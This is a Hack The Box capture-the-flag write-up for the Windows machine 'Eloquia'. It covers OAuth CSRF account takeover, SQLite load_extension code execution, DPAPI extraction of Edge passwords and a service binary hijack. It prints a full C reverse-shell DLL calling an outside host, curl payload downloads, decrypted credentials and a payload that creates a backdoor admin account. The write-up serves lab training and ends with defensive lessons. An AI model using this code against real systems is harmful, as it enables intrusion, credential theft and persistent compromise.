# HTB Eloquia Writeup

## Machine Overview

**Eloquia** is a Hard-rated machine featuring an OAuth CSRF chain, SQLite load_extension abuse for RCE, DPAPI master key extraction, and a service binary hijack for SYSTEM-level privilege escalation.

| Attribute | Value |
|-----------|-------|
| IP | 10.129.244.81 |
| OS | Windows Server 2019 |
| Web | IIS 10.0 with Django CRM + Qooqle OAuth IdP |
| WinRM | Port 5985 |
| Vhosts | eloquia.htb, qooqle.htb |
| AppLocker | Enabled (bypassed via DLL loading) |

**Attack chain:** OAuth CSRF (missing `state` parameter) + Flask callback server + meta refresh → admin account takeover → SQLite `load_extension()` abuse → reverse shell DLL as web user → DPAPI master key extraction via custom SQLite DLL → Edge saved credentials → pivot to Olivia.KAT → Failure2Ban service binary hijacking (weak file ACLs) → SYSTEM.

---

## Reconnaissance & Fingerprinting

### Port Scan & Application Discovery

A quick nmap scan reveals only two open ports — HTTP on 80 and WinRM on 5985. The web server hosts two virtual hosts: `eloquia.htb` (a Django CRM for creating and sharing articles) and `qooqle.htb` (a custom OAuth 2.0 identity provider acting as the SSO backend). The SQL Explorer plugin installed in Django is immediately noted as a high-value attack surface.

```bash
nmap -sC -sV -Pn 10.129.244.81
```

```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Microsoft IIS httpd 10.0
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (WinRM)
```

```bash
echo "10.129.244.81 eloquia.htb qooqle.htb" | sudo tee -a /etc/hosts
```

| Component | Technology | Notes |
|-----------|------------|-------|
| Backend | Django 3.2.18 | Python web framework |
| Database | SQLite | `load_extension()` enabled — RCE vector |
| Frontend | AngularJS 1.8.2 | CSP: default-src 'self' (restricts resources, not navigation) |
| Admin Panel | Grappelli Django Admin | `/accounts/admin/` — SQL Explorer plugin installed |
| OAuth IdP | qooqle.htb | Custom OAuth 2.0 — missing `state` parameter |

---

## Web Exploitation — OAuth Account Takeover

### OAuth CSRF — Missing state Parameter

The OAuth 2.0 flow between Eloquia and Qooqle is missing the mandatory `state` parameter — a cryptographic nonce that ties the authorization request to the user's session. Without it, an attacker can generate a valid OAuth code for their own Qooqle identity and force a victim's session to consume it, relinking the attacker's Qooqle identity to the victim's Eloquia account. The application also runs an admin bot that visits reported articles — providing the victim session needed for the CSRF.

```
# Normal secure OAuth flow:
GET /oauth2/authorize?client_id=...&state=RANDOM_NONCE
... callback validates: state == session.state ✓

# Vulnerable flow (no state):
GET /oauth2/authorize?client_id=...  ← no state parameter
/accounts/oauth2/qooqle/callback/?code=ATTACKER_CODE
# Whichever session hits the callback URL gets linked!
# No nonce = no binding = CSRF account takeover
```

> ⚠️ **Root Cause:** The OAuth `state` parameter is missing. Without it, any valid authorization code can be consumed by any session — enabling CSRF-based identity linking. An attacker who controls a Qooqle account can generate a fresh code and redirect the admin bot to the callback URL, re-linking the attacker's identity to the admin's account.

### Flask Callback Server + Meta Refresh Exploit

The admin bot follows `<meta http-equiv="refresh">` redirects to external URLs. CSP's `default-src 'self'` restricts resource loading but not page navigation — so the meta refresh to the attacker's Flask server is unrestricted. The Flask server generates a fresh OAuth code on each request (important because codes expire in ~10–15 seconds) and immediately redirects the bot to Eloquia's callback endpoint. The bot's admin session consumes the code, completing the account link.

```python
# oauth_takeover.py (key sections)

# Article payload: meta refresh to attacker Flask server
payload = f'<meta http-equiv="refresh" content="0;url=http://{ATTACKER_IP}:{ATTACKER_PORT}/exploit">'

# Flask endpoint: generate fresh code + redirect bot to callback
@app.route('/exploit')
def exploit():
    code = get_fresh_code()   # generates new OAuth code as attacker
    if code:
        return redirect(
            f"{TARGET}/accounts/oauth2/qooqle/callback/?code={code}")
    return "Error", 500

# get_fresh_code(): POSTs to qooqle.htb/oauth2/authorize/
# using attacker's authenticated Qooqle session
# returns a live, single-use authorization code
```

**Attack flow:**
1. Register on eloquia.htb + qooqle.htb, link Qooqle to our account
2. Start Flask server on attacker :8888
3. Create article with meta refresh → `http://ATTACKER:8888/exploit`
4. Report article → admin bot visits our article
5. Bot follows meta refresh → hits Flask `/exploit`
6. Flask generates fresh OAuth code for attacker's Qooqle identity
7. Flask redirects bot to: `/accounts/oauth2/qooqle/callback/?code=<CODE>`
8. Bot's admin session consumes code → attacker Qooqle identity linked to admin
9. Login via "Log in with Qooqle" → authenticate as admin

> **Why Flask?** OAuth codes are single-use and expire within ~10–15 seconds. A pre-generated code embedded in the article would be stale by the time the admin bot visits. The Flask server generates a live code on-demand when the bot arrives, guaranteeing a valid code within the TTL window.

**Admin Account Takeover:** Logging in via "Log in with Qooqle" authenticates as admin with full Django admin panel access — including the SQL Explorer plugin.

---

## Initial Access — SQLite load_extension() RCE

### SQLite Extension Loading → Reverse Shell DLL

The Django SQL Explorer plugin executes raw SQL against the SQLite backend. SQLite's `load_extension()` function loads a Windows DLL and calls its entry point. A reverse shell DLL is compiled with mingw-gcc: `DllMain` connects to the attacker on `DLL_PROCESS_ATTACH`, spawning `cmd.exe` with stdin/stdout/stderr redirected over the socket. The DLL is uploaded via the Django admin file upload (as an article banner), then triggered via SQL Explorer.

```c
// sqlite_revshell.c (DllMain core)
BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID r) {
    if (reason == DLL_PROCESS_ATTACH) {
        WSADATA wd; SOCKET s; struct sockaddr_in a;
        STARTUPINFOA si; PROCESS_INFORMATION pi;

        WSAStartup(MAKEWORD(2,2), &wd);
        s = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
        a.sin_family = AF_INET;
        a.sin_port   = htons(9001);
        a.sin_addr.s_addr = inet_addr("10.10.14.76");

        if (connect(s, (struct sockaddr*)&a, sizeof(a)) == 0) {
            memset(&si, 0, sizeof(si));
            si.cb = sizeof(si);
            si.dwFlags = STARTF_USESTDHANDLES;
            // Redirect stdin/stdout/stderr to socket
            si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;
            CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE,
                          CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        }
    }
    return TRUE;
}
```

```bash
# Cross-compile for Windows x64
x86_64-w64-mingw32-gcc -shared -o xpl.dll sqlite_revshell.c -lws2_32

# Upload via Django admin: /accounts/admin/Eloquia/article/add/
# DLL saved to: /static/assets/images/blog/xpl.dll

# Start listener
nc -lnvp 9001

# Execute via SQL Explorer (omit .dll extension)
SELECT load_extension('static/assets/images/blog/xpl');
```

```cmd
# Shell obtained
connect to [10.10.14.76] from [10.129.244.81]
Microsoft Windows [Version 10.0.17763.8027]
C:\Web\Eloquia> whoami
eloquia\web
```

> ⚠️ **AppLocker Active:** PowerShell scripts and arbitrary executables are blocked. However, DLL loading via SQLite extensions bypasses AppLocker — this same technique is used for DPAPI decryption in the next phase.

**User Flag** — `C:\Users\web\Desktop\user.txt`

---

## Lateral Movement — DPAPI & Edge Credentials

### DPAPI Master Key via Custom SQLite DLL

The `web` user has Microsoft Edge data containing AES-256-GCM encrypted passwords. The encryption key is itself wrapped with DPAPI and stored in `Local State` as the `encrypted_key` field. Decryption requires `CryptUnprotectData` — which must run on the target as the owning user. A custom SQLite extension DLL dynamically loads `Crypt32.dll`, calls `CryptUnprotectData` on the extracted encrypted key, and writes the 32-byte master key to disk. `curl` uploads the DLL (not blocked by AppLocker), and SQL Explorer triggers it.

```c
// DPAPI DLL logic (simplified)
// Load Crypt32 dynamically (avoids import table detection)
HMODULE hCrypt = LoadLibraryA("Crypt32.dll");
FUNC_UNPROTECT pUnprotect = GetProcAddress(hCrypt, "CryptUnprotectData");
FUNC_B64TOBIN  pB64       = GetProcAddress(hCrypt, "CryptStringToBinaryA");

// Read Local State → extract "encrypted_key" → base64 decode
// Skip first 5 bytes ("DPAPI" prefix) → call CryptUnprotectData
// Write 32-byte hex master key to C:\temp\dpapi_debug.txt
```

```bash
# Upload DLL (curl bypasses AppLocker)
curl -o C:\Web\Eloquia\static\assets\images\blog\dpapi3.dll \
  http://10.10.14.76:8080/dpapi_v3.dll

# Trigger via SQL Explorer
SELECT load_extension('static/assets/images/blog/dpapi3');

# Read result from target
C:\temp> type dpapi_debug.txt
[+] Crypt32 loaded dynamically
[+] Decoded: 295 bytes
[+] Master key (32 bytes): c7f1ad7b079947b4bb1dc53b8740440651b6c9f5caf7fd9a18bbece57c7bd444
```

**DPAPI Master Key Recovered:**
```
c7f1ad7b079947b4bb1dc53b8740440651b6c9f5caf7fd9a18bbece57c7bd444
```

### Offline Password Decryption → WinRM Pivot

The Edge `Login Data` SQLite database is exfiltrated via `certutil -encode` (base64 to stdout, then decoded on Kali). Saved passwords use AES-256-GCM with the recovered master key, a 12-byte IV from offset 3 (after the `v10` prefix), and a 16-byte GCM auth tag at the end. Python decrypts all stored credentials, recovering Olivia.KAT's password. WinRM access is then obtained directly.

```python
# AES-256-GCM decryption
from Crypto.Cipher import AES

master_key = bytes.fromhex(
    'c7f1ad7b079947b4bb1dc53b8740440651b6c9f5caf7fd9a18bbece57c7bd444')

def decrypt_password(enc, key):
    iv      = enc[3:15]     # skip "v10" prefix (3 bytes)
    payload = enc[15:-16]   # ciphertext
    tag     = enc[-16:]     # GCM auth tag
    cipher  = AES.new(key, AES.MODE_GCM, nonce=iv)
    return cipher.decrypt_and_verify(payload, tag).decode('utf-8')
```

| URL | Username | Password |
|-----|----------|----------|
| http://eloquia.htb/accounts/login/ | Olivia.KAT | S3cureP@sswdIGu3ss |
| https://chatgpt.com/ | olivia.kat | S3cureP@sswd3Openai |
| https://eloquia.htb/ | test | testtest1234! |

```bash
# WinRM pivot
evil-winrm -i 10.129.244.81 -u 'Olivia.KAT' -p 'S3cureP@sswdIGu3ss'

*Evil-WinRM* PS > whoami
eloquia\olivia.kat
```

**Lateral Movement:** WinRM shell as Olivia.KAT via credentials decrypted from Edge's DPAPI-protected password store.

---

## Privilege Escalation — Failure2Ban Service Hijack

### Service Binary Discovery & Permission Analysis

Service enumeration reveals a custom .NET service named `Failure2Ban` running as `LocalSystem`. The binary path includes `- Prototype` and `\bin\Debug\` — immediate red flags suggesting development-grade security. Running `icacls` confirms that Olivia.KAT has Write (W) permission on the service executable itself — a critical misconfiguration that allows direct binary replacement.

```powershell
# Service binary path
C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\
  Failure2Ban\bin\Debug\Failure2Ban.exe

# Permission check
icacls "C:\Program Files\Qooqle IPS Software\Failure2Ban - Prototype\Failure2Ban\bin\Debug\Failure2Ban.exe"

ELOQUIA\Olivia.KAT:(I)(RX,W)    ← WRITE permission!
NT AUTHORITY\SYSTEM:(I)(F)
BUILTIN\Administrators:(I)(F)
```

> ⚠️ **Critical Misconfiguration:** Olivia.KAT has Write permission on a service binary that runs as LocalSystem. Replacing the binary with a malicious executable guarantees SYSTEM code execution on the next service restart.

### Binary Hijack Payload & Overwrite Loop

A minimal C payload is compiled: it copies the root flag, adds a new admin user, and adds them to the local Administrators group. The service binary is locked while the service is running, so a PowerShell loop retries the overwrite every 50ms until it succeeds — catching the brief window when the service stops before restarting.

```c
// service_hijack.c
#include <windows.h>

int main() {
    // Copy root flag out
    CopyFileA("C:\\Users\\Administrator\\Desktop\\root.txt",
              "C:\\temp\\root.txt", FALSE);
    // Create backdoor admin user
    system("net user pwned H4ckTh3B0x! /add");
    system("net localgroup Administrators pwned /add");
    return 0;
}

// Compile:
x86_64-w64-mingw32-gcc -O2 -s -o service_hijack.exe service_hijack.c
```

```powershell
# Upload payload via curl
curl -o C:\temp\xpl.exe http://10.10.14.76:8080/service_hijack.exe

# Retry overwrite every 50ms until file lock releases
$svc = "C:/Program Files/Qooqle IPS Software/Failure2Ban - Prototype/Failure2Ban/bin/Debug/Failure2Ban.exe"
$i = 0
while($true) {
    try {
        Copy-Item C:/temp/xpl.exe $svc -Force -ErrorAction Stop
        echo "OVERWRITTEN at attempt $i"
        break
    } catch { $i++; Start-Sleep -Milliseconds 50 }
}

OVERWRITTEN at attempt 1223
# Service restarts (~60 seconds) → payload executes as SYSTEM
```

**SYSTEM Execution:** After ~60 seconds the Failure2Ban service restarts, executing the hijacked binary as LocalSystem. Root flag copied to `C:\temp\root.txt`.

**Root Flag** — `C:\Users\Administrator\Desktop\root.txt`

---

## Attack Summary

| Step | Action | Result |
|------|--------|--------|
| 01 | nmap — IIS :80 + WinRM :5985; two vhosts discovered | eloquia.htb (Django CRM + SQL Explorer) · qooqle.htb (OAuth IdP) |
| 02 | OAuth CSRF — missing state parameter identified | Account linking CSRF possible; admin bot visits reported articles |
| 03 | Flask callback server + meta refresh article payload | Admin bot redirected → fresh OAuth code consumed → admin takeover |
| 04 | SQLite load_extension() reverse shell DLL via SQL Explorer | cmd.exe reverse shell as eloquia\web (uid bypasses AppLocker) |
| 05 | User flag — web user desktop | User flag captured |
| 06 | DPAPI master key via custom SQLite DLL (CryptUnprotectData) | 32-byte AES master key: c7f1ad7b… |
| 07 | Offline AES-256-GCM decrypt of Edge Login Data | Olivia.KAT : S3cureP@sswdIGu3ss → evil-winrm shell |
| 08 | Failure2Ban service — Olivia.KAT has Write on binary (LocalSystem) | Binary hijack payload compiled; PowerShell loop overwrites on restart |
| 09 | Service restarts → SYSTEM executes payload → root flag copied | Root flag captured — full compromise |

---

## Key Takeaways

### 01 — OAuth Security: Always Implement the state Parameter
The OAuth `state` parameter is not optional — it's the primary defence against CSRF-based identity linking. Without it, any attacker who controls a legitimate identity provider account can force a victim's session to consume an authorization code, re-linking identities and taking over accounts.

### 02 — CSP Limitations: default-src Does Not Block Navigation
CSP `default-src 'self'` restricts resource loading (scripts, images, XHR) but does **not** restrict page navigation via `<meta http-equiv="refresh">` or `window.location`. Blocking external navigation requires `navigate-to` or explicit `form-action` directives.

### 03 — SQLite Hardening: Disable load_extension() in Production
SQLite's `load_extension()` is an arbitrary DLL loader. If any application component can execute raw SQL with this function enabled, the database becomes a direct RCE vector. Disable it at the sqlite3 connection level with `SQLITE_DBCONFIG_ENABLE_LOAD_EXTENSION = 0` unless explicitly required.

### 04 — AppLocker Bypass: DLL Loading Bypasses Executable Rules
AppLocker rules typically target `.exe` and `.ps1` files. DLL loading via trusted binaries (SQLite, Office, etc.) bypasses these restrictions. AppLocker DLL rules must be explicitly configured and are disabled by default due to performance overhead.

### 05 — Browser Credentials: DPAPI Edge/Chrome Passwords Are a Lateral Move Target
Browser-saved passwords encrypted with DPAPI are decryptable by any process running as the owning user — no password required. Any code execution as a user should include credential harvesting from browser profiles. The Edge `Local State` + `Login Data` pair is a reliable, high-yield target.

### 06 — Service Hardening: Service Binaries Must Not Be User-Writable
A service running as LocalSystem with a user-writable binary is equivalent to giving that user a SYSTEM shell. Service executables should be owned by SYSTEM or Administrators with no write permissions for standard users. Paths containing `Debug`, `Prototype`, or `bin\` are red flags for dev-mode insecure ACLs in production.

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap / gobuster / ffuf | Port scanning, directory and vhost enumeration |
| Python (requests, Flask, PIL) | OAuth takeover script — Qooqle session, fresh code generation, callback server |
| Python (pycryptodome) | AES-256-GCM offline decryption of Edge saved passwords |
| x86_64-w64-mingw32-gcc | Cross-compile reverse shell DLL + DPAPI DLL + service hijack EXE |
| SQLite load_extension() | DLL execution vector (RCE + DPAPI + AppLocker bypass) |
| evil-winrm | WinRM shell as Olivia.KAT |
| nc (netcat) | Reverse shell listener on :9001 |
| certutil -encode | Base64 file exfiltration (Edge Login Data) |
